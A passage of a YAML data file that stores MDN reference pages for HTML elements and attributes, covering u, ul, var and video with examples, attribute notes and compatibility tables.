[`<kbd>`](kbd), and [`<samp>`](samp) elements\n- The [`<pre>`](pre) element for displaying preformatted text blocks\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/tt](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/tt)"
- name: type (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`type`](https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/type)

    [`<button>`](element/button), [`<input>`](element/input), [`<embed>`](element/embed), [`<object>`](element/object), [`<ol>`](element/ol), [`<script>`](element/script), [`<source>`](element/source), [`<style>`](element/style), [`<menu>`](element/menu), [`<link>`](element/link)

    Defines the type of the element.
- name: u
  summary: This feature is well established and works across many devices and browser versions
  description: "# \\<u\\>: The Unarticulated Annotation (Underline) element\n\n## Baseline Widely available\n\nThis feature is well established and works across many devices and browser versions. It’s been available across browsers since July 2015.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FElement%2Fu&level=high)\n\nThe `<u>` [HTML](../index) element represents a span of inline text which should be rendered in a way that indicates that it has a non-textual annotation. This is rendered by default as a simple solid underline, but may be altered using CSS.\n\n**Warning:** This element used to be called the \"Underline\" element in older versions of HTML, and is still sometimes misused in this way. To underline text, you should instead apply a style that includes the CSS [`text-decoration`](https://developer.mozilla.org/en-US/docs/Web/CSS/text-decoration) property set to `underline`.\n\n## Try it\n\n#### HTML Demo: \\<u\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <p>You could use this element to highlight <u>speling</u> mistakes, so the writer can <u>corect</u> them.</p>\n\n    p {\n      margin: 0;\n    }\n\n    u {\n      text-decoration: #f00 wavy underline;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\nSee the [Usage notes](#usage_notes) section for further details on when it's appropriate to use `<u>` and when it isn't.\n\n## Attributes\n\nThis element only includes the [global attributes](../global_attributes).\n\n## Usage notes\n\nAlong with other pure styling elements, the original HTML Underline (`<u>`) element was deprecated in HTML 4; however, `<u>` was restored in HTML 5 with a new, semantic, meaning: to mark text as having some form of non-textual annotation applied.\n\n**Note:** Avoid using the `<u>` element with its default styling (of underlined text) in such a way as to be confused with a hyperlink, which is also underlined by default.\n\n### Use cases\n\nValid use cases for the `<u>` element include annotating spelling errors, applying a [proper name mark](https://en.wikipedia.org/wiki/Proper_name_mark) to denote proper names in Chinese text, and other forms of annotation.\n\nYou should *not* use `<u>` to underline text for presentation purposes, or to denote titles of books.\n\n### Other elements to consider using\n\nIn most cases, you should use an element other than `<u>`, such as:\n\n- [`<em>`](em) to denote stress emphasis\n- [`<b>`](b) to draw attention to text\n- [`<mark>`](mark) to mark key words or phrases\n- [`<strong>`](strong) to indicate that text has strong importance\n- [`<cite>`](cite) to mark the titles of books or other publications\n- [`<i>`](i) to denote technical terms, transliterations, thoughts, or names of vessels in Western texts\n\nTo provide textual annotations (as opposed to the non-textual annotations created with `<u>`), use the [`<ruby>`](ruby) element.\n\nTo apply an underlined appearance without any semantic meaning, use the [`text-decoration`](https://developer.mozilla.org/en-US/docs/Web/CSS/text-decoration) property's value `underline`.\n\n## Examples\n\n### Indicating a spelling error\n\nThis example uses the `<u>` element and some CSS to display a paragraph which includes a misspelled error, with the error indicated in the red wavy underline style which is fairly commonly used for this purpose.\n\n#### HTML\n\nhtml\n\n```\n<p>This paragraph includes a <u class=\"spelling\">wrnogly</u> spelled word.</p>\n```\n\nIn the HTML, we see the use of `<u>` with a class, `spelling`, which is used to indicate the misspelling of the word \"wrongly\".\n\n#### CSS\n\ncss\n\n```\nu.spelling {\n  text-decoration: red wavy underline;\n}\n```\n\nThis CSS indicates that when the `<u>` element is styled with the class `spelling`, it should have a red wavy underline underneath its text. This is a common styling for spelling errors. Another common style can be presented using `red dashed underline`.\n\n#### Result\n\nThe result should be familiar to anyone who has used any of the more popular word processors available today.\n\n### Avoiding \\<u\\>\n\nMost of the time, you actually don't want to use `<u>`. Here are some examples that show what you should do instead in several cases.\n\n#### Non-semantic underlines\n\nTo underline text without implying any semantic meaning, use a [`<span>`](span) element with the [`text-decoration`](https://developer.mozilla.org/en-US/docs/Web/CSS/text-decoration) property set to `\"underline\"`, as shown below.\n\n##### HTML\n\nhtml\n\n```\n<span class=\"underline\">Today's Special</span>\n<br />\nChicken Noodle Soup With Carrots\n```\n\n##### CSS\n\ncss\n\n```\n.underline {\n  text-decoration: underline;\n}\n```\n\n##### Result\n\n#### Presenting a book title\n\nBook titles should be presented using the [`<cite>`](cite) element instead of `<u>` or even `<i>`.\n\n##### Using the cite element\n\nhtml\n\n```\n<p>The class read <cite>Moby Dick</cite> in the first term.</p>\n```\n\n##### Styling the cite element\n\nThe default styling for the `<cite>` element renders the text in italics. You can override that using CSS:\n\nhtml\n\n```\n<p>The class read <cite>Moby Dick</cite> in the first term.</p>\n```\n\ncss\n\n```\ncite {\n  font-style: normal;\n  text-decoration: underline;\n}\n```\n\n## Technical summary\n\n|                                             |                                                                                                                                   |\n|---------------------------------------------|-----------------------------------------------------------------------------------------------------------------------------------|\n| [Content categories](../content_categories) | [Flow content](../content_categories#flow_content), [phrasing content](../content_categories#phrasing_content), palpable content. |\n| Permitted content                           | [Phrasing content](../content_categories#phrasing_content).                                                                       |\n| Tag omission                                | None, both the starting and ending tag are mandatory.                                                                             |\n| Permitted parents                           | Any element that accepts [phrasing content](../content_categories#phrasing_content).                                              |\n| Implicit ARIA role                          | [`generic`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/generic_role)                                   |\n| Permitted ARIA roles                        | Any                                                                                                                               |\n| DOM interface                               | [`HTMLElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement)                                                     |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n[TABLE]\n\n## See also\n\n- The [`<span>`](span), [`<i>`](i), [`<em>`](em), [`<b>`](b), and [`<cite>`](cite) elements should usually be used instead.\n- The CSS [`text-decoration`](https://developer.mozilla.org/en-US/docs/Web/CSS/text-decoration) property should be used for non-semantic underlining.\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/u](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/u)"
- name: ul
  summary: This feature is well established and works across many devices and browser versions
  description: "# \\<ul\\>: The Unordered List element\n\n## Baseline Widely available\n\nThis feature is well established and works across many devices and browser versions. It’s been available across browsers since July 2015.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FElement%2Ful&level=high)\n\nThe `<ul>` [HTML](../index) element represents an unordered list of items, typically rendered as a bulleted list.\n\n## Try it\n\n#### HTML Demo: \\<ul\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <ul>\n      <li>Milk</li>\n      <li>\n        Cheese\n        <ul>\n          <li>Blue cheese</li>\n          <li>Feta</li>\n        </ul>\n      </li>\n    </ul>\n\n    li {\n      list-style-type: circle;\n    }\n\n    li li {\n      list-style-type: square;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n## Attributes\n\nThis element includes the [global attributes](../global_attributes).\n\n[`compact`](#compact) Deprecated  \nThis Boolean attribute hints that the list should be rendered in a compact style. The interpretation of this attribute depends on the [user agent](https://developer.mozilla.org/en-US/docs/Glossary/User_agent), and it doesn't work in all browsers.\n\n**Warning:** Do not use this attribute, as it has been deprecated: use [CSS](https://developer.mozilla.org/en-US/docs/Web/CSS) instead. To give a similar effect as the `compact` attribute, the CSS property [`line-height`](https://developer.mozilla.org/en-US/docs/Web/CSS/line-height) can be used with a value of `80%`.\n\n[`type`](#type) Deprecated  \nThis attribute sets the bullet style for the list. The values defined under HTML3.2 and the transitional version of HTML 4.0/4.01 are:\n\n- `circle`\n- `disc`\n- `square`\n\nA fourth bullet type has been defined in the WebTV interface, but not all browsers support it: `triangle`.\n\nIf not present and if no [CSS](https://developer.mozilla.org/en-US/docs/Web/CSS) [`list-style-type`](https://developer.mozilla.org/en-US/docs/Web/CSS/list-style-type) property applies to the element, the user agent selects a bullet type depending on the nesting level of the list.\n\n**Warning:** Do not use this attribute, as it has been deprecated; use the [CSS](https://developer.mozilla.org/en-US/docs/Web/CSS) [`list-style-type`](https://developer.mozilla.org/en-US/docs/Web/CSS/list-style-type) property instead.\n\n## Usage notes\n\n- The `<ul>` element is for grouping a collection of items that do not have a numerical ordering, and their order in the list is meaningless. Typically, unordered-list items are displayed with a bullet, which can be of several forms, like a dot, a circle, or a square. The bullet style is not defined in the HTML description of the page, but in its associated CSS, using the [`list-style-type`](https://developer.mozilla.org/en-US/docs/Web/CSS/list-style-type) property.\n- The `<ul>` and [`<ol>`](ol) elements may be nested as deeply as desired. Moreover, the nested lists may alternate between `<ol>` and `<ul>` without restriction.\n- The [`<ol>`](ol) and `<ul>` elements both represent a list of items. They differ in that, with the [`<ol>`](ol) element, the order is meaningful. To determine which one to use, try changing the order of the list items; if the meaning is changed, the [`<ol>`](ol) element should be used, otherwise you can use `<ul>`.\n\n## Examples\n\n### Simple example\n\nhtml\n\n```\n<ul>\n  <li>first item</li>\n  <li>second item</li>\n  <li>third item</li>\n</ul>\n```\n\n#### Result\n\n### Nesting a list\n\nhtml\n\n```\n<ul>\n  <li>first item</li>\n  <li>\n    second item\n    <!-- Look, the closing </li> tag is not placed here! -->\n    <ul>\n      <li>second item first subitem</li>\n      <li>\n        second item second subitem\n        <!-- Same for the second nested unordered list! -->\n        <ul>\n          <li>second item second subitem first sub-subitem</li>\n          <li>second item second subitem second sub-subitem</li>\n          <li>second item second subitem third sub-subitem</li>\n        </ul>\n      </li>\n      <!-- Closing </li> tag for the li that\n                  contains the third unordered list -->\n      <li>second item third subitem</li>\n    </ul>\n    <!-- Here is the closing </li> tag -->\n  </li>\n  <li>third item</li>\n</ul>\n```\n\n#### Result\n\n### Ordered list inside unordered list\n\nhtml\n\n```\n<ul>\n  <li>first item</li>\n  <li>\n    second item\n    <!-- Look, the closing </li> tag is not placed here! -->\n    <ol>\n      <li>second item first subitem</li>\n      <li>second item second subitem</li>\n      <li>second item third subitem</li>\n    </ol>\n    <!-- Here is the closing </li> tag -->\n  </li>\n  <li>third item</li>\n</ul>\n```\n\n#### Result\n\n## Technical summary\n\n|                                             ||\n|---------------------------------------------||\n| [Content categories](../content_categories) | [Flow content](../content_categories#flow_content), and if the `<ul>` element's children include at least one [`<li>`](li) element, [palpable content](../content_categories#palpable_content).                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |\n| Permitted content                           | Zero or more [`<li>`](li), [`<script>`](script) and [`<template>`](template) elements|\n| Tag omission                                | None, both the starting and ending tag are mandatory|\n| Permitted parents                           | Any element that accepts [flow content](../content_categories#flow_content|\n| Implicit ARIA role                          | [`list`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/list_role|\n| Permitted ARIA roles                        | [`directory`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/directory_role), [`group`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/group_role), [`listbox`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/listbox_role), [`menu`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/menu_role), [`menubar`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/menubar_role), [`none`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/none_role), [`presentation`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/presentation_role), [`radiogroup`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/radiogroup_role), [`tablist`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/tablist_role), [`toolbar`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/toolbar_role), [`tree`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/tree_role) |\n| DOM Interface                               | [`HTMLUListElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLUListElement|\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|           | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|-----------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|           | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `ul`      | 1       | 12   | 1       | 15    | ≤4     | 18             | 4                   | 14            | ≤3.2          | 1.0              | 4.4             |     |\n| `compact` | 1       | 12   | 1       | 15    | 3      | 18             | 4                   | 14            | 2             | 1.0              | 4.4             |     |\n| `type`    | 1       | 12   | 1       | 15    | ≤4     | 18             | 4                   | 14            | ≤3.2          | 1.0              | 4.4             |     |\n\n## See also\n\n- Other list-related HTML Elements: [`<ol>`](ol), [`<li>`](li), [`<menu>`](menu)\n- CSS properties that may be specially useful to style the `<ul>` element:\n  - the [`list-style`](https://developer.mozilla.org/en-US/docs/Web/CSS/list-style) property, to choose the way the ordinal displays.\n  - [CSS counters](https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_counter_styles/Using_CSS_counters), to handle complex nested lists.\n  - the [`line-height`](https://developer.mozilla.org/en-US/docs/Web/CSS/line-height) property, to simulate the deprecated [`compact`](#compact) attribute.\n  - the [`margin`](https://developer.mozilla.org/en-US/docs/Web/CSS/margin) property, to control the list indentation.\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/ul](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/ul)"
- name: usemap (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`usemap`](https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/usemap)

    [`<img>`](element/img), [`<input>`](element/input), [`<object>`](element/object)
- name: value (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`value`](https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/value)

    [`<button>`](element/button), [`<data>`](element/data), [`<input>`](element/input), [`<li>`](element/li), [`<meter>`](element/meter), [`<option>`](element/option), [`<progress>`](element/progress), [`<param>`](element/param)

    Defines a default value which will be displayed in the element on page load.
- name: var
  summary: This feature is well established and works across many devices and browser versions
  description: "# \\<var\\>: The Variable element\n\n## Baseline Widely available\n\nThis feature is well established and works across many devices and browser versions. It’s been available across browsers since July 2015.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FElement%2Fvar&level=high)\n\nThe `<var>` [HTML](../index) element represents the name of a variable in a mathematical expression or a programming context. It's typically presented using an italicized version of the current typeface, although that behavior is browser-dependent.\n\n## Try it\n\n#### HTML Demo: \\<var\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <p>\n      The volume of a box is <var>l</var> × <var>w</var> × <var>h</var>, where <var>l</var> represents the length,\n      <var>w</var> the width and <var>h</var> the height of the box.\n    </p>\n\n    var {\n      font-weight: bold;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n## Attributes\n\nThis element only includes the [global attributes](../global_attributes).\n\n## Usage notes\n\n### Related elements\n\nOther elements that are used in contexts in which `<var>` is commonly used include:\n\n- [`<code>`](code): The HTML Code element\n- [`<kbd>`](kbd): The HTML Keyboard input element\n- [`<samp>`](samp): The HTML Sample Output element\n\nIf you encounter code that is mistakenly using `<var>` for style purposes rather than semantic purposes, you should either use a [`<span>`](span) with appropriate CSS or, an appropriate semantic element among the following:\n\n- [`<em>`](em)\n- [`<i>`](i)\n- [`<q>`](q)\n\n### Default style\n\nMost browsers apply [`font-style`](https://developer.mozilla.org/en-US/docs/Web/CSS/font-style) to `\"italic\"` when rendering `<var>`. This can be overridden in CSS, like this:\n\ncss\n\n```\nvar {\n  font-style: normal;\n}\n```\n\n## Examples\n\n### Basic example\n\nHere's a simple example, using `<var>` to denote variable names in a mathematical equation.\n\nhtml\n\n```\n<p>A simple equation: <var>x</var> = <var>y</var> + 2</p>\n```\n\n#### Result\n\n### Overriding the default style\n\nUsing CSS, you can override the default style for the `<var>` element. In this example, variable names are rendered in bold, using Courier if it's available, otherwise it falls back to the default monospace font.\n\n#### CSS\n\ncss\n\n```\nvar {\n  font:\n    bold 15px \"Courier\",\n    \"Courier New\",\n    monospace;\n}\n```\n\n#### HTML\n\nhtml\n\n```\n<p>\n  The variables <var>minSpeed</var> and <var>maxSpeed</var> control the minimum\n  and maximum speed of the apparatus in revolutions per minute (RPM).\n</p>\n```\n\nThis HTML uses `<var>` to enclose the names of two variables.\n\n#### Result\n\n## Technical summary\n\n|                                             |                                                                                                                                   |\n|---------------------------------------------|-----------------------------------------------------------------------------------------------------------------------------------|\n| [Content categories](../content_categories) | [Flow content](../content_categories#flow_content), [phrasing content](../content_categories#phrasing_content), palpable content. |\n| Permitted content                           | [Phrasing content](../content_categories#phrasing_content).                                                                       |\n| Tag omission                                | None, both the starting and ending tag are mandatory.                                                                             |\n| Permitted parents                           | Any element that accepts [phrasing content](../content_categories#phrasing_content).                                              |\n| Implicit ARIA role                          | [No corresponding role](https://www.w3.org/TR/html-aria/#dfn-no-corresponding-role)                                               |\n| Permitted ARIA roles                        | Any                                                                                                                               |\n| DOM interface                               | [`HTMLElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement)                                                     |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|       | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|-------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|       | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `var` | 1       | 12   | 1       | 15    | ≤4     | 18             | 4                   | 14            | ≤3.2          | 1.0              | 4.4             |     |\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/var](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/var)"
- name: video
  summary: This feature is well established and works across many devices and browser versions
  description: "# \\<video\\>: The Video Embed element\n\n## Baseline Widely available\n\nThis feature is well established and works across many devices and browser versions. It’s been available across browsers since July 2015.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FElement%2Fvideo&level=high)\n\nThe `<video>` [HTML](../index) element embeds a media player which supports video playback into the document. You can use `<video>` for audio content as well, but the [`<audio>`](audio) element may provide a more appropriate user experience.\n\n## Try it\n\n#### HTML Demo: \\<video\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <video controls width=\"250\">\n      <source src=\"/media/cc0-videos/flower.webm\" type=\"video/webm\" />\n\n      <source src=\"/media/cc0-videos/flower.mp4\" type=\"video/mp4\" />\n\n      Download the\n      <a href=\"/media/cc0-videos/flower.webm\">WEBM</a>\n      or\n      <a href=\"/media/cc0-videos/flower.mp4\">MP4</a>\n      video.\n    </video>\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\nThe above example shows simple usage of the `<video>` element. Similarly to the [`<img>`](img) element, we include a path to the media we want to display inside the `src` attribute; we can include other attributes to specify information such as video width and height, whether we want it to autoplay and loop, or to show the browser's default video controls, etc.\n\nThe content inside the opening and closing `<video></video>` tags is shown as a fallback in browsers that don't support the element.\n\n## Attributes\n\nLike all other HTML elements, this element supports the [global attributes](../global_attributes).\n\n[`autoplay`](#autoplay)  \nA Boolean attribute; if specified, the video automatically begins to play back as soon as it can without stopping to finish loading the data.\n\n**Note:** Modern browsers block audio (or videos with an unmuted audio track) from autoplaying, as sites that automatically play audio can be an unpleasant experience for users. See our [autoplay guide](https://developer.mozilla.org/en-US/docs/Web/Media/Autoplay_guide) for additional information about how to properly use autoplay.\n\nTo disable video autoplay, `autoplay=\"false\"` will not work; the video will autoplay if the attribute is there in the `<video>` tag at all. To remove autoplay, the attribute needs to be removed altogether.\n\n[`controls`](#controls)  \nIf this attribute is present, the browser will offer controls to allow the user to control video playback, including volume, seeking, and pause/resume playback.\n\n[`controlslist`](#controlslist)  \nThe [`controlslist`](https://wicg.github.io/controls-list/explainer.html) attribute, when specified, helps the browser select what controls to show for the `video` element whenever the browser shows its own set of controls (that is, when the `controls` attribute is specified).\n\nThe allowed values are `nodownload`, `nofullscreen` and `noremoteplayback`.\n\nUse the [`disablepictureinpicture`](#disablepictureinpicture) attribute if you want to disable the Picture-In-Picture mode (and the control).\n\n[`crossorigin`](../attributes/crossorigin)  \nThis [enumerated](https://developer.mozilla.org/en-US/docs/Glossary/Enumerated) attribute indicates whether to use CORS to fetch the related video. [CORS-enabled resources](../cors_enabled_image) can be reused in the [`<canvas>`](canvas) element without being *tainted*. The allowed values are:\n\n[`anonymous`](#anonymous)  \nSends a cross-origin request without a credential. In other words, it sends the `Origin:` HTTP header without a cookie, X.509 certificate, or performing HTTP Basic authentication. If the server does not give credentials to the origin site (by not setting the `Access-Control-Allow-Origin:` HTTP header), the resource will be *tainted*, and its usage restricted.\n\n[`use-credentials`](#use-credentials)  \nSends a cross-origin request with a credential. In other words, it sends the `Origin:` HTTP header with a cookie, a certificate, or performing HTTP Basic authentication. If the server does not give credentials to the origin site (through `Access-Control-Allow-Credentials:` HTTP header), the resource will be *tainted* and its usage restricted.\n\nWhen not present, the resource is fetched without a CORS request (i.e. without sending the `Origin:` HTTP header), preventing its non-tainted use in [`<canvas>`](canvas) elements. If invalid, it is handled as if the enumerated keyword `anonymous` was used. See [CORS settings attributes](../attributes/crossorigin) for additional information.\n\n[`disablepictureinpicture`](#disablepictureinpicture)  \nPrevents the browser from suggesting a Picture-in-Picture context menu or to request Picture-in-Picture automatically in some cases.\n\n[`disableremoteplayback`](#disableremoteplayback)  \nA Boolean attribute used to disable the capability of remote playback in devices that are attached using wired (HDMI, DVI, etc.) and wireless technologies (Miracast, Chromecast, DLNA, AirPlay, etc.).\n\nIn Safari, you can use [`x-webkit-airplay=\"deny\"`](https://developer.apple.com/library/archive/documentation/AudioVideo/Conceptual/AirPlayGuide/OptingInorOutofAirPlay/OptingInorOutofAirPlay.html) as a fallback.\n\n[`height`](#height)  \nThe height of the video's display area, in [CSS pixels](https://drafts.csswg.org/css-values/#px) (absolute values only; [no percentages](https://html.spec.whatwg.org/multipage/embedded-content.html#dimension-attributes)).\n\n[`loop`](#loop)  \nA Boolean attribute; if specified, the browser will automatically seek back to the start upon reaching the end of the video.\n\n[`muted`](#muted)  \nA Boolean attribute that indicates the default audio mute setting contained in the video. If set, the audio will be initially silenced. Its default value is `false`, meaning the audio will be played when the video is played.\n\n[`playsinline`](#playsinline)  \nA Boolean attribute indicating that the video is to be played \"inline\", that is, within the element's playback area. Note that the absence of this attribute *does not* imply that the video will always be played in fullscreen.\n\n[`poster`](#poster)  \nA URL for an image to be shown while the video is downloading. If this attribute isn't specified, nothing is displayed until the first frame is available, then the first frame is shown as the poster frame.\n\n[`preload`](#preload)  \nThis [enumerated](https://developer.mozilla.org/en-US/docs/Glossary/Enumerated) attribute is intended to provide a hint to the browser about what the author thinks will lead to the best user experience regarding what content is loaded before the video is played. It may have one of the following values:\n\n- `none`: Indicates that the video should not be preloaded.\n- `metadata`: Indicates that only video metadata (e.g. length) is fetched.\n- `auto`: Indicates that the whole video file can be downloaded, even if the user is not expected to use it.\n- *empty string*: A synonym of the `auto` value.\n\nThe default value is different for each browser. The spec advises it to be set to `metadata`.\n\n**Note:**\n\n- The `autoplay` attribute has precedence over `preload`. If `autoplay` is specified, the browser would obviously need to start downloading the video for playback.\n- The specification does not force the browser to follow the value of this attribute; it is a mere hint.\n\n[`src`](#src)  \nThe URL of the video to embed. This is optional; you may instead use the [`<source>`](source) element within the video block to specify the video to embed.\n\n[`width`](#width)  \nThe width of the video's display area, in [CSS pixels](https://drafts.csswg.org/css-values/#px) (absolute values only; [no percentages](https://html.spec.whatwg.org/multipage/embedded-content.html#dimension-attributes)).\n\n## Events\n\n| Event Name                                                                                                           | Fired When                                                                                                                                                                                                                                        |\n|----------------------------------------------------------------------------------------------------------------------|---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| [`audioprocess`](https://developer.mozilla.org/en-US/docs/Web/API/ScriptProcessorNode/audioprocess_event) Deprecated | The input buffer of a [`ScriptProcessorNode`](https://developer.mozilla.org/en-US/docs/Web/API/ScriptProcessorNode) is ready to be processed.                                                                                                     |\n| [`canplay`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement/canplay_event)                         | The browser can play the media, but estimates that not enough data has been loaded to play the media up to its end without having to stop for further buffering of content.                                                                       |\n| [`canplaythrough`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement/canplaythrough_event)           | The browser estimates it can play the media up to its end without stopping for content buffering.                                                                                                                                                 |\n| [`complete`](https://developer.mozilla.org/en-US/docs/Web/API/OfflineAudioContext/complete_event)                    | The rendering of an [`OfflineAudioContext`](https://developer.mozilla.org/en-US/docs/Web/API/OfflineAudioContext) is terminated.                                                                                                                  |\n| [`durationchange`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement/durationchange_event)           | The `duration` attribute has been updated.                                                                                                                                                                                                        |\n| [`emptied`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement/emptied_event)                         | The media has become empty; for example, this event is sent if the media has already been loaded (or partially loaded), and the [`load()`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement/load) method is called to reload it. |\n| [`ended`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement/ended_event)                             | Playback has stopped because the end of the media was reached.                                                                                                                                                                                    |\n| [`error`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement/error_event)                             | An error occurred while fetching the media data, or the type of the resource is not a supported media format.                                                                                                                                     |\n| [`loadeddata`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement/loadeddata_event)                   | The first frame of the media has finished loading.                                                                                                                                                                                                |\n| [`loadedmetadata`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement/loadedmetadata_event)           | The metadata has been loaded.                                                                                                                                                                                                                     |\n| [`loadstart`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement/loadstart_event)                     | Fired when the browser has started to load the resource.                                                                                                                                                                                          |\n| [`pause`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement/pause_event)                             | Playback has been paused.                                                                                                                                                                                                                         |\n| [`play`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement/play_event)                               | Playback has begun.                                                                                                                                                                                                                               |\n| [`playing`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement/playing_event)                         | Playback is ready to start after having been paused or delayed due to lack of data.                                                                                                                                                               |\n| [`progress`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement/progress_event)                       | Fired periodically as the browser loads a resource.                                                                                                                                                                                               |\n| [`ratechange`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement/ratechange_event)                   | The playback rate has changed.                                                                                                                                                                                                                    |\n| [`seeked`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement/seeked_event)                           | A *seek* operation completed.                                                                                                                                                                                                                     |\n| [`seeking`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement/seeking_event)                         | A *seek* operation began.                                                                                                                                                                                                                         |\n| [`stalled`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement/stalled_event)                         | The user agent is trying to fetch media data, but data is unexpectedly not forthcoming.                                                                                                                                                           |\n| [`suspend`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement/suspend_event)                         | Media data loading has been suspended.                                                                                                                                                                                                            |\n| [`timeupdate`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement/timeupdate_event)                   | The time indicated by the `currentTime` attribute has been updated.                                                                                                                                                                               |\n| [`volumechange`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement/volumechange_event)               | The volume has changed.                                                                                                                                                                                                                           |\n| [`waiting`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement/waiting_event)                         | 